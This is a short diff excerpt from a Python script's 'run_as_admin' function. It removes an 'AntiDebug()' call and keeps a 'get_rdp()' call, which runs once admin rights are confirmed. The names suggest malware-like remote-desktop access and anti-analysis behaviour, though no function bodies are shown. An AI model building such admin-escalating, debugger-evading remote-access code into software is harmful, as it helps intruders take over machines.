@@ -45,7 +45,6 @@ def is_admin():
 def run_as_admin():
     script = os.path.abspath(sys.argv[0])
     if is_admin():
-        AntiDebug()
         get_rdp()
         
     else:
